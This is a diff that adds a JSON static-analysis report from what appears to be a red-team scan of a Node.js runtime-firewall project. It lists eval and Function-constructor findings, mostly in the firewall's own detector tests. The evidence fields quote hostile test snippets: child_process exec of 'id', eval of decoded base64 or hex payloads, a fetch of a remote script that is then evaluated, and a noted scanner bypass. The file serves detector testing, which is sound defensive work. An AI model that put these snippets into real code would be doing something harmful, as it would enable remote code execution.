@@ -1,0 +1,1245 @@
+{
+  "generated_at": "2026-08-13T06:13:32.585338+00:00",
+  "mode": "repo",
+  "repo_root": "C:\\Users\\SuperAdmin\\.vscode\\aletheia-redteam-kit\\targets\\runtime-firewall-mvp",
+  "source": {
+    "kind": "local_path",
+    "value": "C:\\Users\\SuperAdmin\\.vscode\\aletheia-redteam-kit\\targets\\runtime-firewall-mvp"
+  },
+  "files_scanned": 152,
+  "secret_scan": {
+    "include_test_fixtures": false,
+    "excluded_globs": [
+      "tests/**",
+      "test/**"
+    ],
+    "allowlist_marker": "aletheia-redteam:allowed-test-fixture"
+  },
+  "enabled_scanners": [
+    "ci_config",
+    "dep_advisories",
+    "dep_hygiene",
+    "language_risks",
+    "secrets",
+    "threat_feed"
+  ],
+  "ignored_artifacts": [
+    "summary.json",
+    "summary_*.json",
+    "website_summary.json",
+    "report.md",
+    "runs/**"
+  ],
+  "dependencies": {
+    "scan_mode": "auto",
+    "manifests": {
+      "python": [],
+      "npm": [
+        "node_modules\\@bcoe\\v8-coverage\\package.json",
+        "node_modules\\@fastify\\ajv-compiler\\package.json",
+        "node_modules\\@fastify\\error\\package.json",
+        "node_modules\\@fastify\\fast-json-stringify-compiler\\package.json",
+        "node_modules\\@fastify\\forwarded\\package.json",
+        "node_modules\\@fastify\\merge-json-schemas\\package.json",
+        "node_modules\\@fastify\\proxy-addr\\package.json",
+        "node_modules\\@fw\\control\\package.json",
+        "node_modules\\@isaacs\\cliui\\package.json",
+        "node_modules\\@istanbuljs\\schema\\package.json",
+        "node_modules\\@jridgewell\\resolve-uri\\package.json",
+        "node_modules\\@jridgewell\\sourcemap-codec\\package.json",
+        "node_modules\\@jridgewell\\trace-mapping\\package.json",
+        "node_modules\\@pinojs\\redact\\package.json",
+        "node_modules\\@pkgjs\\parseargs\\package.json",
+        "node_modules\\@types\\istanbul-lib-coverage\\package.json",
+        "node_modules\\abstract-logging\\package.json",
+        "node_modules\\ajv-formats\\package.json",
+        "node_modules\\ajv\\node_modules\\fast-uri\\benchmark\\package.json",
+        "node_modules\\ajv\\node_modules\\fast-uri\\package.json",
+        "node_modules\\ajv\\package.json",
+        "node_modules\\aletheia-firewall\\package.json",
+        "node_modules\\ansi-regex\\package.json",
+        "node_modules\\ansi-styles\\package.json",
+        "node_modules\\atomic-sleep\\package.json",
+        "node_modules\\avvio\\package.json",
+        "node_modules\\balanced-match\\dist\\commonjs\\package.json",
+        "node_modules\\balanced-match\\dist\\esm\\package.json",
+        "node_modules\\balanced-match\\package.json",
+        "node_modules\\brace-expansion\\dist\\commonjs\\package.json",
+        "node_modules\\brace-expansion\\dist\\esm\\package.json",
+        "node_modules\\brace-expansion\\package.json",
+        "node_modules\\c8\\package.json",
+        "node_modules\\cliui\\node_modules\\ansi-regex\\package.json",
+        "node_modules\\cliui\\node_modules\\ansi-styles\\package.json",
+        "node_modules\\cliui\\node_modules\\emoji-regex\\package.json",
+        "node_modules\\cliui\\node_modules\\string-width\\package.json",
+        "node_modules\\cliui\\node_modules\\strip-ansi\\package.json",
+        "node_modules\\cliui\\node_modules\\wrap-ansi\\package.json",
+        "node_modules\\cliui\\package.json",
+        "node_modules\\color-convert\\package.json",
+        "node_modules\\color-name\\package.json",
+        "node_modules\\convert-source-map\\package.json",
+        "node_modules\\cookie\\package.json",
+        "node_modules\\cross-spawn\\package.json",
+        "node_modules\\dequal\\package.json",
+        "node_modules\\eastasianwidth\\package.json",
+        "node_modules\\emoji-regex\\package.json",
+        "node_modules\\escalade\\package.json",
+        "node_modules\\fast-decode-uri-component\\package.json",
+        "node_modules\\fast-deep-equal\\package.json",
+        "node_modules\\fast-json-stringify\\package.json",
+        "node_modules\\fast-querystring\\package.json",
+        "node_modules\\fast-uri\\benchmark\\package.json",
+        "node_modules\\fast-uri\\package.json",
+        "node_modules\\fastify\\package.json",
+        "node_modules\\fastify\\test\\bundler\\esbuild\\package.json",
+        "node_modules\\fastify\\test\\bundler\\webpack\\package.json",
+        "node_modules\\fastq\\package.json",
+        "node_modules\\find-my-way\\package.json",
+        "node_modules\\find-up\\package.json",
+        "node_modules\\foreground-child\\dist\\commonjs\\package.json",
+        "node_modules\\foreground-child\\dist\\esm\\package.json",
+        "node_modules\\foreground-child\\package.json",
+        "node_modules\\get-caller-file\\package.json",
+        "node_modules\\glob\\dist\\commonjs\\package.json",
+        "node_modules\\glob\\dist\\esm\\package.json",
+        "node_modules\\glob\\node_modules\\balanced-match\\package.json",
+        "node_modules\\glob\\node_modules\\brace-expansion\\package.json",
+        "node_modules\\glob\\node_modules\\minimatch\\dist\\commonjs\\package.json",
+        "node_modules\\glob\\node_modules\\minimatch\\dist\\esm\\package.json",
+        "node_modules\\glob\\node_modules\\minimatch\\package.json",
+        "node_modules\\glob\\package.json",
+        "node_modules\\has-flag\\package.json",
+        "node_modules\\html-escaper\\cjs\\package.json",
+        "node_modules\\html-escaper\\package.json",
+        "node_modules\\html-escaper\\test\\package.json",
+        "node_modules\\ipaddr.js\\package.json",
+        "node_modules\\is-fullwidth-code-point\\package.json",
+        "node_modules\\isexe\\package.json",
+        "node_modules\\istanbul-lib-coverage\\package.json",
+        "node_modules\\istanbul-lib-report\\package.json",
+        "node_modules\\istanbul-reports\\package.json",
+        "node_modules\\jackspeak\\dist\\commonjs\\package.json",
+        "node_modules\\jackspeak\\dist\\esm\\package.json",
+        "node_modules\\jackspeak\\package.json",
+        "node_modules\\json-schema-ref-resolver\\package.json",
+        "node_modules\\json-schema-traverse\\package.json",
+        "node_modules\\light-my-request\\node_modules\\process-warning\\package.json",
+        "node_modules\\light-my-request\\package.json",
+        "node_modules\\locate-path\\package.json",
+        "node_modules\\lru-cache\\dist\\commonjs\\package.json",
+        "node_modules\\lru-cache\\dist\\esm\\package.json",
+        "node_modules\\lru-cache\\package.json",
+        "node_modules\\make-dir\\package.json",
+        "node_modules\\minimatch\\dist\\commonjs\\package.json",
+        "node_modules\\minimatch\\dist\\esm\\package.json",
+        "node_modules\\minimatch\\package.json",
+        "node_modules\\minipass\\dist\\commonjs\\package.json",
+        "node_modules\\minipass\\dist\\esm\\package.json",
+        "node_modules\\minipass\\package.json",
+        "node_modules\\on-exit-leak-free\\package.json",
+        "node_modules\\p-limit\\package.json",
+        "node_modules\\p-locate\\package.json",
+        "node_modules\\package-json-from-dist\\dist\\commonjs\\package.json",
+        "node_modules\\package-json-from-dist\\dist\\esm\\package.json",
+        "node_modules\\package-json-from-dist\\package.json",
+        "node_modules\\path-exists\\package.json",
+        "node_modules\\path-key\\package.json",
+        "node_modules\\path-scurry\\dist\\commonjs\\package.json",
+        "node_modules\\path-scurry\\dist\\esm\\package.json",
+        "node_modules\\path-scurry\\package.json",
+        "node_modules\\pino-abstract-transport\\package.json",
+        "node_modules\\pino-std-serializers\\package.json",
+        "node_modules\\pino\\package.json",
+        "node_modules\\pino\\test\\fixtures\\transport\\package.json",
+        "node_modules\\process-warning\\package.json",
+        "node_modules\\quick-format-unescaped\\package.json",
+        "node_modules\\real-require\\package.json",
+        "node_modules\\require-directory\\package.json",
+        "node_modules\\require-from-string\\package.json",
+        "node_modules\\ret\\package.json",
+        "node_modules\\reusify\\package.json",
+        "node_modules\\rfdc\\package.json",
+        "node_modules\\safe-regex2\\package.json",
+        "node_modules\\safe-stable-stringify\\esm\\package.json",
+        "node_modules\\safe-stable-stringify\\package.json",
+        "node_modules\\secure-json-parse\\benchmarks\\package.json",
+        "node_modules\\secure-json-parse\\package.json",
+        "node_modules\\semver\\package.json",
+        "node_modules\\set-cookie-parser\\package.json",
+        "node_modules\\shebang-command\\package.json",
+        "node_modules\\shebang-regex\\package.json",
+        "node_modules\\signal-exit\\dist\\cjs\\package.json",
+        "node_modules\\signal-exit\\dist\\mjs\\package.json",
+        "node_modules\\signal-exit\\package.json",
+        "node_modules\\sonic-boom\\package.json",
+        "node_modules\\split2\\package.json",
+        "node_modules\\string-width-cjs\\node_modules\\ansi-regex\\package.json",
+        "node_modules\\string-width-cjs\\node_modules\\emoji-regex\\package.json",
+        "node_modules\\string-width-cjs\\node_modules\\strip-ansi\\package.json",
+        "node_modules\\string-width-cjs\\package.json",
+        "node_modules\\string-width\\package.json",
+        "node_modules\\strip-ansi-cjs\\node_modules\\ansi-regex\\package.json",
+        "node_modules\\strip-ansi-cjs\\package.json",
+        "node_modules\\strip-ansi\\package.json",
+        "node_modules\\supports-color\\package.json",
+        "node_modules\\test-exclude\\package.json",
+        "node_modules\\thread-stream\\package.json",
+        "node_modules\\toad-cache\\package.json",
+        "node_modules\\v8-to-istanbul\\package.json",
+        "node_modules\\which\\package.json",
+        "node_modules\\wrap-ansi-cjs\\node_modules\\ansi-regex\\package.json",
+        "node_modules\\wrap-ansi-cjs\\node_modules\\ansi-styles\\package.json",
+        "node_modules\\wrap-ansi-cjs\\node_modules\\emoji-regex\\package.json",
+        "node_modules\\wrap-ansi-cjs\\node_modules\\string-width\\package.json",
+        "node_modules\\wrap-ansi-cjs\\node_modules\\strip-ansi\\package.json",
+        "node_modules\\wrap-ansi-cjs\\package.json",
+        "node_modules\\wrap-ansi\\package.json",
+        "node_modules\\y18n\\package.json",
+        "node_modules\\yargs-parser\\package.json",
+        "node_modules\\yargs\\helpers\\package.json",
+        "node_modules\\yargs\\node_modules\\ansi-regex\\package.json",
+        "node_modules\\yargs\\node_modules\\emoji-regex\\package.json",
+        "node_modules\\yargs\\node_modules\\string-width\\package.json",
+        "node_modules\\yargs\\node_modules\\strip-ansi\\package.json",
+        "node_modules\\yargs\\package.json",
+        "node_modules\\yocto-queue\\package.json",
+        "package-lock.json",
+        "package.json",
+        "packages\\fw-agent\\package.json",
+        "packages\\fw-control\\package.json"
+      ],
+      "cargo": [],
+      "go": [],
+      "ruby": [],
+      "other": []
+    },
+    "tools": {
+      "pip_audit": {
+        "status": "not_run"
+      },
+      "osv_scanner": {
+        "status": "unavailable",
+        "reason": "binary_not_found"
+      },
+      "npm_audit": {
+        "status": "executed",
+        "exit_code": "0",
+        "source": "runtime_scan"
+      },
+      "cargo_audit": {
+        "status": "not_run"
+      }
+    },
+    "findings_total": 0,
+    "findings_by_severity": {
+      "CRITICAL": 0,
+      "HIGH": 0,
+      "MEDIUM": 0,
+      "LOW": 0
+    },
+    "findings_by_language": {},
+    "reachability": {
+      "direct": 0,
+      "transitive": 0,
+      "unknown": 0
+    },
+    "exploitability_score": 0,
+    "top_packages": [],
+    "signals": {
+      "malware_suspect_total": 0,
+      "tampering_risk_total": 0,
+      "suspicious_package_total": 0,
+      "top_suspicious_packages": []
+    }
+  },
+  "extra_tools": {},
+  "findings_total": 69,
+  "findings_by_severity": {
+    "CRITICAL": 0,
+    "HIGH": 68,
+    "MEDIUM": 1,
+    "LOW": 0
+  },
+  "findings_by_type": {
+    "missing_pyproject": 1,
+    "javascript_eval": 52,
+    "javascript_function_constructor": 16
+  },
+  "first_party_non_test_findings_total": 4,
+  "first_party_non_test_by_severity": {
+    "CRITICAL": 0,
+    "HIGH": 3,
+    "MEDIUM": 1,
+    "LOW": 0
+  },
+  "first_party_non_test_high_critical_count": 3,
+  "risk_score": 0,
+  "threat_feed": {
+    "source": "built_in",
+    "matches_total": 52,
+    "matches_by_type": {
+      "javascript_eval": 52
+    }
+  },
+  "gates": {
+    "pass": true,
+    "violations": []
+  },
+  "findings": [
+    {
+      "severity": "HIGH",
+      "type": "javascript_eval",
+      "title": "JavaScript eval usage",
+      "file": "aletheia-soak-test.js",
+      "line": 38,
+      "evidence": "'evalchain.js':  \"const c=eval('req'+'uire');require('child_process').execSync('id');\",",
+      "recommendation": "Remove eval and use safe parsing/dispatch mechanisms.",
+      "threat_context": [
+        {
+          "threat": "Code injection",
+          "reference": "https://owasp.org/www-community/attacks/Code_Injection"
+        }
+      ]
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_eval",
+      "title": "JavaScript eval usage",
+      "file": "packages\\fw-agent\\src\\behavior-tracker.js",
+      "line": 188,
+      "evidence": "'eval(', 'new function', 'function(', 'vm.runincontext', 'vm.runinnewcontext',",
+      "recommendation": "Remove eval and use safe parsing/dispatch mechanisms.",
+      "threat_context": [
+        {
+          "threat": "Code injection",
+          "reference": "https://owasp.org/www-community/attacks/Code_Injection"
+        }
+      ]
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_eval",
+      "title": "JavaScript eval usage",
+      "file": "packages\\fw-agent\\src\\detector.js",
+      "line": 83,
+      "evidence": "'eval(',",
+      "recommendation": "Remove eval and use safe parsing/dispatch mechanisms.",
+      "threat_context": [
+        {
+          "threat": "Code injection",
+          "reference": "https://owasp.org/www-community/attacks/Code_Injection"
+        }
+      ]
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_eval",
+      "title": "JavaScript eval usage",
+      "file": "packages\\fw-agent\\test\\aho-corasick-debug.js",
+      "line": 2,
+      "evidence": "const matcher = new AhoCorasick(['stratum','pool.hashvault','eval(','new function','net.createconnection']);",
+      "recommendation": "Remove eval and use safe parsing/dispatch mechanisms.",
+      "threat_context": [
+        {
+          "threat": "Code injection",
+          "reference": "https://owasp.org/www-community/attacks/Code_Injection"
+        }
+      ]
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_eval",
+      "title": "JavaScript eval usage",
+      "file": "packages\\fw-agent\\test\\aho-corasick-debug.js",
+      "line": 5,
+      "evidence": "console.log('match3', matcher.search('eval('));",
+      "recommendation": "Remove eval and use safe parsing/dispatch mechanisms.",
+      "threat_context": [
+        {
+          "threat": "Code injection",
+          "reference": "https://owasp.org/www-community/attacks/Code_Injection"
+        }
+      ]
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_eval",
+      "title": "JavaScript eval usage",
+      "file": "packages\\fw-agent\\test\\aho-corasick-unit-test.js",
+      "line": 4,
+      "evidence": "const matcher = new AhoCorasick(['stratum', 'pool.hashvault', 'eval(', 'new function', 'net.createconnection']);",
+      "recommendation": "Remove eval and use safe parsing/dispatch mechanisms.",
+      "threat_context": [
+        {
+          "threat": "Code injection",
+          "reference": "https://owasp.org/www-community/attacks/Code_Injection"
+        }
+      ]
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_eval",
+      "title": "JavaScript eval usage",
+      "file": "packages\\fw-agent\\test\\aho-corasick-unit-test.js",
+      "line": 8,
+      "evidence": "assert.strictEqual(matcher.search('eval('), 'eval(');",
+      "recommendation": "Remove eval and use safe parsing/dispatch mechanisms.",
+      "threat_context": [
+        {
+          "threat": "Code injection",
+          "reference": "https://owasp.org/www-community/attacks/Code_Injection"
+        }
+      ]
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_eval",
+      "title": "JavaScript eval usage",
+      "file": "packages\\fw-agent\\test\\behavior-tracker-unit-test.js",
+      "line": 66,
+      "evidence": "const v = bt.analyzeModule('rce.js', `eval(x); require('child_process').exec(y);`);",
+      "recommendation": "Remove eval and use safe parsing/dispatch mechanisms.",
+      "threat_context": [
+        {
+          "threat": "Code injection",
+          "reference": "https://owasp.org/www-community/attacks/Code_Injection"
+        }
+      ]
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_eval",
+      "title": "JavaScript eval usage",
+      "file": "packages\\fw-agent\\test\\behavior-tracker-unit-test.js",
+      "line": 73,
+      "evidence": "const v = bt.analyzeModule('obf.js', `const p = Buffer.from('eA==','base64').toString(); eval(p);`);",
+      "recommendation": "Remove eval and use safe parsing/dispatch mechanisms.",
+      "threat_context": [
+        {
+          "threat": "Code injection",
+          "reference": "https://owasp.org/www-community/attacks/Code_Injection"
+        }
+      ]
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_function_constructor",
+      "title": "Function constructor usage",
+      "file": "packages\\fw-agent\\test\\behavior-tracker-unit-test.js",
+      "line": 79,
+      "evidence": "const v = bt.analyzeModule('obf2.js', `const c = atob(blob); new Function(c)();`);",
+      "recommendation": "Avoid runtime code generation from strings."
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_eval",
+      "title": "JavaScript eval usage",
+      "file": "packages\\fw-agent\\test\\behavior-tracker-unit-test.js",
+      "line": 84,
+      "evidence": "const v = bt.analyzeModule('obf3.js', `const p = Buffer.from(h,'hex').toString(); eval(p);`);",
+      "recommendation": "Remove eval and use safe parsing/dispatch mechanisms.",
+      "threat_context": [
+        {
+          "threat": "Code injection",
+          "reference": "https://owasp.org/www-community/attacks/Code_Injection"
+        }
+      ]
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_eval",
+      "title": "JavaScript eval usage",
+      "file": "packages\\fw-agent\\test\\behavior-tracker-unit-test.js",
+      "line": 94,
+      "evidence": "const v = bt.analyzeModule('build.js', `module.exports = eval('1 + 2');`);",
+      "recommendation": "Remove eval and use safe parsing/dispatch mechanisms.",
+      "threat_context": [
+        {
+          "threat": "Code injection",
+          "reference": "https://owasp.org/www-community/attacks/Code_Injection"
+        }
+      ]
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_eval",
+      "title": "JavaScript eval usage",
+      "file": "packages\\fw-agent\\test\\behavior-tracker-unit-test.js",
+      "line": 99,
+      "evidence": "const v = bt.analyzeModule('copy.js', `const b = Buffer.from(arr); eval('1'); module.exports = b;`);",
+      "recommendation": "Remove eval and use safe parsing/dispatch mechanisms.",
+      "threat_context": [
+        {
+          "threat": "Code injection",
+          "reference": "https://owasp.org/www-community/attacks/Code_Injection"
+        }
+      ]
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_eval",
+      "title": "JavaScript eval usage",
+      "file": "packages\\fw-agent\\test\\behavior-tracker-unit-test.js",
+      "line": 104,
+      "evidence": "const v = bt.analyzeModule('cmt.js', `// Buffer.from(x, 'base64') would decode it\\nmodule.exports = eval('40 + 2');`);",
+      "recommendation": "Remove eval and use safe parsing/dispatch mechanisms.",
+      "threat_context": [
+        {
+          "threat": "Code injection",
+          "reference": "https://owasp.org/www-community/attacks/Code_Injection"
+        }
+      ]
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_eval",
+      "title": "JavaScript eval usage",
+      "file": "packages\\fw-agent\\test\\detector-unit-test.js",
+      "line": 16,
+      "evidence": "result = detector.scanModuleSync('test-package', 'const x = eval(\"2+2\");' + filler);",
+      "recommendation": "Remove eval and use safe parsing/dispatch mechanisms.",
+      "threat_context": [
+        {
+          "threat": "Code injection",
+          "reference": "https://owasp.org/www-community/attacks/Code_Injection"
+        }
+      ]
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_eval",
+      "title": "JavaScript eval usage",
+      "file": "packages\\fw-agent\\test\\detector-unit-test.js",
+      "line": 20,
+      "evidence": "const evalWarn = result.detections.find(d => d.warnOnly && d.matched === 'eval(');",
+      "recommendation": "Remove eval and use safe parsing/dispatch mechanisms.",
+      "threat_context": [
+        {
+          "threat": "Code injection",
+          "reference": "https://owasp.org/www-community/attacks/Code_Injection"
+        }
+      ]
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_eval",
+      "title": "JavaScript eval usage",
+      "file": "packages\\fw-agent\\test\\detector-unit-test.js",
+      "line": 21,
+      "evidence": "assert.ok(evalWarn, 'eval( must surface as a warnOnly detection (F-20)');",
+      "recommendation": "Remove eval and use safe parsing/dispatch mechanisms.",
+      "threat_context": [
+        {
+          "threat": "Code injection",
+          "reference": "https://owasp.org/www-community/attacks/Code_Injection"
+        }
+      ]
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_eval",
+      "title": "JavaScript eval usage",
+      "file": "packages\\fw-agent\\test\\detector-unit-test.js",
+      "line": 25,
+      "evidence": "result = detector.scanModuleSync('test-package', 'eval(userInput); require(\"child_process\").exec(userInput);' + filler);",
+      "recommendation": "Remove eval and use safe parsing/dispatch mechanisms.",
+      "threat_context": [
+        {
+          "threat": "Code injection",
+          "reference": "https://owasp.org/www-community/attacks/Code_Injection"
+        }
+      ]
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_eval",
+      "title": "JavaScript eval usage",
+      "file": "packages\\fw-agent\\test\\prescreener-superset-test.js",
+      "line": 77,
+      "evidence": "'eval(\"1\")',",
+      "recommendation": "Remove eval and use safe parsing/dispatch mechanisms.",
+      "threat_context": [
+        {
+          "threat": "Code injection",
+          "reference": "https://owasp.org/www-community/attacks/Code_Injection"
+        }
+      ]
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_function_constructor",
+      "title": "Function constructor usage",
+      "file": "packages\\fw-agent\\test\\prescreener-superset-test.js",
+      "line": 78,
+      "evidence": "'new Function(\"return 1\")',",
+      "recommendation": "Avoid runtime code generation from strings."
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_eval",
+      "title": "JavaScript eval usage",
+      "file": "packages\\fw-control\\test\\adversarial\\adversarial.test.js",
+      "line": 57,
+      "evidence": "test('Direct eval() is blocked', () => {",
+      "recommendation": "Remove eval and use safe parsing/dispatch mechanisms.",
+      "threat_context": [
+        {
+          "threat": "Code injection",
+          "reference": "https://owasp.org/www-community/attacks/Code_Injection"
+        }
+      ]
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_eval",
+      "title": "JavaScript eval usage",
+      "file": "packages\\fw-control\\test\\adversarial\\adversarial.test.js",
+      "line": 60,
+      "evidence": "eval(code);",
+      "recommendation": "Remove eval and use safe parsing/dispatch mechanisms.",
+      "threat_context": [
+        {
+          "threat": "Code injection",
+          "reference": "https://owasp.org/www-community/attacks/Code_Injection"
+        }
+      ]
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_eval",
+      "title": "JavaScript eval usage",
+      "file": "packages\\fw-control\\test\\adversarial\\adversarial.test.js",
+      "line": 118,
+      "evidence": "eval(payload);",
+      "recommendation": "Remove eval and use safe parsing/dispatch mechanisms.",
+      "threat_context": [
+        {
+          "threat": "Code injection",
+          "reference": "https://owasp.org/www-community/attacks/Code_Injection"
+        }
+      ]
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_eval",
+      "title": "JavaScript eval usage",
+      "file": "packages\\fw-control\\test\\adversarial\\adversarial.test.js",
+      "line": 138,
+      "evidence": "const evalOnly = pad(`module.exports = eval('1 + 2');`);",
+      "recommendation": "Remove eval and use safe parsing/dispatch mechanisms.",
+      "threat_context": [
+        {
+          "threat": "Code injection",
+          "reference": "https://owasp.org/www-community/attacks/Code_Injection"
+        }
+      ]
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_eval",
+      "title": "JavaScript eval usage",
+      "file": "packages\\fw-control\\test\\adversarial\\adversarial.test.js",
+      "line": 143,
+      "evidence": "const commentDecode = pad(`// Buffer.from(x, 'base64') would decode it\\nmodule.exports = eval('40 + 2');`);",
+      "recommendation": "Remove eval and use safe parsing/dispatch mechanisms.",
+      "threat_context": [
+        {
+          "threat": "Code injection",
+          "reference": "https://owasp.org/www-community/attacks/Code_Injection"
+        }
+      ]
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_eval",
+      "title": "JavaScript eval usage",
+      "file": "packages\\fw-control\\test\\adversarial\\adversarial.test.js",
+      "line": 180,
+      "evidence": "eval(code);",
+      "recommendation": "Remove eval and use safe parsing/dispatch mechanisms.",
+      "threat_context": [
+        {
+          "threat": "Code injection",
+          "reference": "https://owasp.org/www-community/attacks/Code_Injection"
+        }
+      ]
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_eval",
+      "title": "JavaScript eval usage",
+      "file": "packages\\fw-control\\test\\adversarial\\adversarial.test.js",
+      "line": 248,
+      "evidence": "console.log('  [KNOWN BYPASS] variable-alias eval evades signature scanner (no \"eval(\" in source)');",
+      "recommendation": "Remove eval and use safe parsing/dispatch mechanisms.",
+      "threat_context": [
+        {
+          "threat": "Code injection",
+          "reference": "https://owasp.org/www-community/attacks/Code_Injection"
+        }
+      ]
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_eval",
+      "title": "JavaScript eval usage",
+      "file": "packages\\fw-control\\test\\adversarial\\adversarial.test.js",
+      "line": 277,
+      "evidence": "const tiny = 'eval(require(\"child_process\").exec(\"id\"));\\nmodule.exports = {};\\n// ' + 'x'.repeat(420);",
+      "recommendation": "Remove eval and use safe parsing/dispatch mechanisms.",
+      "threat_context": [
+        {
+          "threat": "Code injection",
+          "reference": "https://owasp.org/www-community/attacks/Code_Injection"
+        }
+      ]
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_eval",
+      "title": "JavaScript eval usage",
+      "file": "packages\\fw-control\\test\\adversarial\\adversarial.test.js",
+      "line": 583,
+      "evidence": "const src = pad(`fetch('https://cdn.example/a.js').then(r=>r.text()).then(t=>eval(t)); module.exports = {};`);",
+      "recommendation": "Remove eval and use safe parsing/dispatch mechanisms.",
+      "threat_context": [
+        {
+          "threat": "Code injection",
+          "reference": "https://owasp.org/www-community/attacks/Code_Injection"
+        }
+      ]
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_function_constructor",
+      "title": "Function constructor usage",
+      "file": "packages\\fw-control\\test\\adversarial\\adversarial.test.js",
+      "line": 605,
+      "evidence": "const src = pad(`const add = new Function('a', 'b', 'return a + b'); module.exports = add;`);",
+      "recommendation": "Avoid runtime code generation from strings."
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_eval",
+      "title": "JavaScript eval usage",
+      "file": "packages\\fw-control\\test\\adversarial\\adversarial.test.js",
+      "line": 652,
+      "evidence": "const src = pad(`const b = process.binding('spawn_sync'); eval('void 0'); module.exports = b;`);",
+      "recommendation": "Remove eval and use safe parsing/dispatch mechanisms.",
+      "threat_context": [
+        {
+          "threat": "Code injection",
+          "reference": "https://owasp.org/www-community/attacks/Code_Injection"
+        }
+      ]
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_eval",
+      "title": "JavaScript eval usage",
+      "file": "packages\\fw-control\\test\\adversarial\\adversarial.test.js",
+      "line": 681,
+      "evidence": "detector.scanModuleSync('a.js', \"eval(payload);\", '/n/node_modules/evil/a.js', 'evil');",
+      "recommendation": "Remove eval and use safe parsing/dispatch mechanisms.",
+      "threat_context": [
+        {
+          "threat": "Code injection",
+          "reference": "https://owasp.org/www-community/attacks/Code_Injection"
+        }
+      ]
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_eval",
+      "title": "JavaScript eval usage",
+      "file": "packages\\fw-control\\test\\detection-live-test.js",
+      "line": 36,
+      "evidence": "eval(code);",
+      "recommendation": "Remove eval and use safe parsing/dispatch mechanisms.",
+      "threat_context": [
+        {
+          "threat": "Code injection",
+          "reference": "https://owasp.org/www-community/attacks/Code_Injection"
+        }
+      ]
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_eval",
+      "title": "JavaScript eval usage",
+      "file": "packages\\fw-control\\test\\detector-unit-test.js",
+      "line": 36,
+      "evidence": "eval(encoded.toString());",
+      "recommendation": "Remove eval and use safe parsing/dispatch mechanisms.",
+      "threat_context": [
+        {
+          "threat": "Code injection",
+          "reference": "https://owasp.org/www-community/attacks/Code_Injection"
+        }
+      ]
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_eval",
+      "title": "JavaScript eval usage",
+      "file": "packages\\fw-control\\test\\detector-unit-test.js",
+      "line": 45,
+      "evidence": "new Function('eval(Buffer.from(\"malicious\").toString())')();",
+      "recommendation": "Remove eval and use safe parsing/dispatch mechanisms.",
+      "threat_context": [
+        {
+          "threat": "Code injection",
+          "reference": "https://owasp.org/www-community/attacks/Code_Injection"
+        }
+      ]
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_function_constructor",
+      "title": "Function constructor usage",
+      "file": "packages\\fw-control\\test\\detector-unit-test.js",
+      "line": 45,
+      "evidence": "new Function('eval(Buffer.from(\"malicious\").toString())')();",
+      "recommendation": "Avoid runtime code generation from strings."
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_function_constructor",
+      "title": "Function constructor usage",
+      "file": "red-team\\corpus\\benign-controls-extended.js",
+      "line": 92,
+      "evidence": "code: `module.exports.compile = (body) => new Function('data', 'with(data){return \\`' + body + '\\`}');`,",
+      "recommendation": "Avoid runtime code generation from strings."
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_eval",
+      "title": "JavaScript eval usage",
+      "file": "red-team\\corpus\\benign-controls.js",
+      "line": 55,
+      "evidence": "code: `module.exports = { value: eval('40 + 2') };`,",
+      "recommendation": "Remove eval and use safe parsing/dispatch mechanisms.",
+      "threat_context": [
+        {
+          "threat": "Code injection",
+          "reference": "https://owasp.org/www-community/attacks/Code_Injection"
+        }
+      ]
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_function_constructor",
+      "title": "Function constructor usage",
+      "file": "red-team\\corpus\\benign-controls.js",
+      "line": 116,
+      "evidence": "description: 'lodash.template-style compiler using new Function (WARN-only, no process exec / decode)',",
+      "recommendation": "Avoid runtime code generation from strings."
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_function_constructor",
+      "title": "Function constructor usage",
+      "file": "red-team\\corpus\\benign-controls.js",
+      "line": 118,
+      "evidence": "module.exports.compile = (src) => new Function('data', 'return ' + JSON.stringify(src));",
+      "recommendation": "Avoid runtime code generation from strings."
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_eval",
+      "title": "JavaScript eval usage",
+      "file": "red-team\\corpus\\dynamic-code-exec-extended.js",
+      "line": 11,
+      "evidence": "code: `const c = getRemote(); eval(c); require('child_process').spawnSync('sh', ['-c', c]);`,",
+      "recommendation": "Remove eval and use safe parsing/dispatch mechanisms.",
+      "threat_context": [
+        {
+          "threat": "Code injection",
+          "reference": "https://owasp.org/www-community/attacks/Code_Injection"
+        }
+      ]
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_function_constructor",
+      "title": "Function constructor usage",
+      "file": "red-team\\corpus\\dynamic-code-exec-extended.js",
+      "line": 18,
